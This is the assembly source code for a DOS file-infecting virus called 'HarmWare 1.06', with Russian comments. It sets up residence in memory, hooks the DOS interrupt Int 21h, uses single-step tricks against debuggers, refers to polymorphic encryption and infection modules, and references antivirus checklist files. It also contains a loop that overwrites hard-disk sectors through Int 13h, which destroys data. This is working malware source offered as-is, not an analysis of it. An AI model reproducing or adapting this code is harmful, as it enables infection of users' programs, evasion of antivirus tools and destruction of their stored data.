;
;	HarmWare 1.06 by Ak Kort [SOS group]
;
;	Основное тело вируса. Выполняется сразу после полиморфного
;	дешифратора.
;

    page 0,255
    .model small
    .code

;include msg.inc

VirusSize	= (EndVirus_2-BeginVirus +15)/16	
;start1		= (((EndVirus-BeginVirus)+451)/16)
StartFile	= 3840;start1*16		; место, откуда начинается архив

	@CallInt21	MACRO 		; вызов старого Int 21
	  call Old21
	ENDM
		
    assume ds:_TEXT,es:_TEXT,ss:_TEXT
BeginVirus:
	mov sp,es	; мы SP в ES сохраняли
	push cx		; после LOOP'а CX=0

	mov ax,ds	; брать нужно именно DS, а не CS, так как для
	dec ax		; EXE DS<>CS
	
	mov es,ax	; получаем сегмент собственного MCB

	mov bx,es:[3]	; Уменьшаем размер блока так, чтобы осталось
	push ds		; место для вируса и таблицы привязок
	pop es
	sub bx,VirusSize+1	; (и еще 16 байт на MCB)
	mov ah,4Ah
	int 21h
	

	mov ax,5800h	; Выделяем память (желательно в UMB) для вируса
	int 21h
	push ax
	mov ax,5802h
	int 21h
	push ax
	mov si,sp
	mov bx,1
	mov ax,5803h
	int 21h
	mov bx,82h
	mov ax,5801h
	int 21h
AfterInt:
	mov si,cs:[si-6]	;получаем адрес метки AfterInt
	mov ah,48h
	mov bx,VirusSize
	int 21h			;выделили блок
	mov es,ax
	pop cx
	pop bx
	mov ax,5801h
	int 21h	
	mov bl,cl
	mov ax,5803h
	int 21h
; восстановили стратегию

	pop ds		;мы в стек засунули CX=0 (сразу после LOOP'а)
	
	mov ds:[4],offset EnterPoint	;настройка обработчика Int 1
	mov ds:[6],es

	mov ds:[12],offset New_03	;а это декодер
	mov ds:[14],es
;--------------------------- если комментируешь, кодируй с опцией /NOCODE

;пересылка вируса в новую часть
	push cs
	pop ds
	sub si,AfterInt-BeginVirus
	xor di,di
	mov cx,(EndVirus-BeginVirus+1)/2
	cld
	rep movsw

	push es		;назначаем стек на резидентную часть
	pop ss
	lea sp,stack

	pushf
	mov si,sp		;включаем режим пошагового выполнения
	pushf			;адрес процедуры обработки Int 1 - старт
	inc byte ptr es:[si-1]	;резидентной части вируса
	popf
	popf		; гы :) многие отладчики не эмулируют int 1 между
			; двумя popf :)

;push es			;запуск резидента - потом уберу
;mov bx,offset EnterPoint
;push bx
;retf

;эта часть будет выполнятся только в случае пошагового выполнения
;mov ah,4Ch	;в конце это закоментирую
;int 21h
;------------------- очень опасная часть !
;			  --  установка указателя Int 8 на Int 26  --
;			через каждые 1/18.2 секунды вызывается Int 26 со
;			случайными значениями !
;
;			надоело. дай-ка поменяю это на запись секторов...
;
	mov cx,0101
@@1:	mov ax,03FFh
	mov dx,080h
	int 13h
	add ch,1
	adc dh,0
	jmp @@1

;------------------------ не вздумай запускать !

EnterPoint:	;сюда приходим по Int 1. Учти, что ты уже в другом сегменте
	
	mov ax,offset Change_MCB
	push ax
	
Start_Of_Code_d:
	byte 0,0,0,0,0
	mov cs:FileSeg,ds	;DS = CS загруженой программы
	push cs
	pop ds
	
;NextCheck:
	mov ax,1E02h	;проверка присутствия резидента
	int 21h		;функция 1E стандартно возвращает AX=1E00
	cmp ax,021Eh
	jz AlreadyLoaded
	mov cl,82h
	shr ax,cl
	jz AlreadyLoaded	; Процессор ниже 386. Наверное не стОит...
	xor ax,ax
	push ax
	int 1Ah				; инициализируем генератор случайных
	mov word ptr ds:Old_Rnd,dx	; чисел по таймеру.
	pop ds
	;
	; Теперь нам надо проверить - если мы находимся в UMB, то можно
	; остаться резидентом прямо тут, иначе - записываем вирус на место
	; программы, оставляем его резидентным и выполняем повторный
	; запуск программы. Ее имя найдем в сегменте окружения.
	;
	mov ax,cs
	cmp ax,0c800h
	jc Not_In_UMB
	
	call NewInts	
	mov dx,8		; адрес владельца блока
	mov bx,'CS'		; название блока
	retn
Not_In_UMB:
	mov dx,1
	retn
AlreadyLoaded:	
	xor dx,dx		; адрес владельца = 0 - блок свободен
	retn
	
;
; Немножко саморекламы ;-)
;

My_Name	byte 13,10,13,10,9,9,'    - HarmWare v1.06 by Ak Kort [SOS group] -',13,10
	byte 9,9,"Hi! I'm still alive :) Let me introduce my new release.",13,10
	byte 9,'  There are none distruction. Just another way of anti-heuristic...',13,10,13,10,36

End_Of_Code_d:

NewInts:
	call Remove_Guard
	lea dx, New_21
	lea di, Old_21
	mov bx,84h
	call ChangeInt
	
;	mov dx,offset New_08	; а вот и таймер
;	mov di,offset Old_08
;	mov bx,8*4
;	call ChangeInt
	call TestPricol
;	mov cs:under_1f,0	; признак работы из-под Adinf
	retn
	
Change_MCB:
	cmp dx,1	; dx=1 если требуется резидентность в LowMem
	jz LowMemRes
	mov ax,cs
	dec ax
	mov ds,ax
	mov word ptr ds:[1],dx	; устанавливаем MCB как надо
	mov word ptr ds:[8],bx
	mov bx,cs:FileSeg	; берем сегмент программы
	test cs:Exe_Flag,1
	jz @DecodeCom
	sub bx,16
@DecodeCom:
	mov ds,bx	; выполняем распаковку
	mov es,bx
byte 0B9h	;mov cx,PackedLen
PackedLen	word 507

byte 0BEh	;mov si,ArcStart
ArcStart word Here_You_Are + 5+100h

	delta equ 6
	
	mov di,100h-delta
	push word ptr [di]
	push word ptr [di+2]
	push word ptr [di+4]
;	push word ptr [di+6]
;	push word ptr [di+8]
;	push word ptr [di+10]
;	push word ptr [di+12]
;	push word ptr [di+14]
	push di

	mov ax,offset End_Of_Code_e
	push ax
		
	push cx
	rep movsb
	xchg ax,cx
	pop cx
	mov si,cx
	add si,100h-delta-1		;si=PakedLen+0F9h

byte 0BFh	;mov di,FileLen+256
FileLen_x word 4615+256
;	dec si
	dec di
byte 0B2h	;mov dl,CodeByte
CodeByte byte 255


Start_Of_Code_e:		; Ето надобно закодировать. Пусть наши
	byte 0,0,0,0,0		; вирусологи помучаются
	
	std			; по поводу архивации смотрите в lzss.inc
@303:
	lodsb
	cmp al,dl
	jnz @302
	dec cx
	lodsb
	or al,al
	jnz @301
	mov al,dl
@302:	stosb
	jmp short @300
@301:	dec cx
	push cx
	 mov cx,ax
	 lodsb
	 push si
	  mov si,di
	  add si,ax
	  rep movsb
	 pop si
	pop cx
@300:	loop @303
	
	retn
	nop
End_Of_Code_e:

	cld
	pop di
;	pop word ptr [di+14]
;	pop word ptr [di+12]
;	pop word ptr [di+10]
;	pop word ptr [di+8]
;	pop word ptr [di+6]
	pop word ptr [di+4]
	pop word ptr [di+2]
	pop word ptr [di]
				; распаковали. Чудно.
	test cs:Exe_Flag,1	; Теперича запускаем
	jz Im_Com
	add bx,10h
	byte 0B8h	;mov ax,
Old_ss	word 0
	add ax,bx
	mov ss,ax
	byte 0BCh	;mov sp,
Old_sp	word 0
	byte 81h,0C3h	;add bx,
Old_cs	word 0
	push bx
	byte 0B8h	;mov ax,
Old_ip	word 0
	jmp short Start_Infected
Im_Com:
	dec bx
	mov ds,bx
	inc bx
	mov ax,ds:[3]
	push es
	pop ds
	mov ss,bx
	mov sp,-2
	cmp ax,4096
	jnc @imc1
	add ax,ax
	add ax,ax
	add ax,ax
	add ax,ax
	dec ax
	and ax,-2
	mov sp,ax
@imc1:
	push cx
	push bx
	mov ax,256
Start_Infected:			; Скатертью дорожка
	push ax
	sti
	retf
.386

;include debug.inc
include lowmem.inc
include lzss.inc
include infect.inc
include morph.inc
include anti_-d.inc
include int21.inc
include exepack.inc
;include adinf.inc
include pricol.inc

Exe_Flag	byte 0	; байт показывает тип файла: 0-COM 1-EXE
CHKLIST_1	byte 'chklist.ms',0
CHKLIST_2	byte 'chklist.cps',0

EndVirus:

Old_Rnd		byte 0
Old_Rnd_Low	byte 0
FileSeg		word 0
Old_Dta		word 0,0
Relo_Seg	word 0
Old_03		word 0,0
Old_24		word 0,0
No_Any_Key	word 0
TimeBomb	word 0
;under_1f	byte 0
_trash		word 0

ExecParam:

write_pos	equ dword ptr [$]
write_pos_l	word 0
write_pos_h	word 0

read_pos	equ dword ptr [$]
read_pos_l	word 0
read_pos_h	word 0

FileNum		word 0

FileLen_l	word 0
FileLen_h	word 0

AllLen_l	word 0
AllLen_h	word 0
HeadLen		word 0


int21sp		word 0
int21ss		word 0

ProgName:

nam_dx		word 0
nam_ds		word 0
old_ax		word 0
old_bx		word 0
old_cx		word 0
old_dx		word 0
old_di		word 0
old_si		word 0
old_ds		word 0
Code_Offset	word 0
Coded_Arrea_Offset	word 0
Len_Offset	word 0
Offset_Offset	word 0
Inc_Value	word 0

file_dx		word 0
file_ds		word 0
file_date	word 0
file_time	word 0

New_Dta		byte 15h dup (0)
Dta_Attr	byte 0
Dta_Time	word 0
Dta_Date	word 0
Dta_Size	word 0,0
Dta_Name	byte '?????????????'

Header_ID	word 0
Header_Last	word 0
Header_Pages	word 0
Header_Relocs	word 0
Header_Len	word 0
Header_Minumum	word 0
Header_Maximum	word 0
Header_SS	word 0
Header_SP	word 0
Header_CheckSum	word 0
Header_IP	word 0
Header_CS	word 0
Header_ReloAdr	word 0
Header_Overlay	word 0
RealSeg	word 0

	byte 256 dup(0)	
	
stack equ $-2

EndVirus_2:

Here_You_Are:		; это небольшая зараженная программа
	include today.inc
END
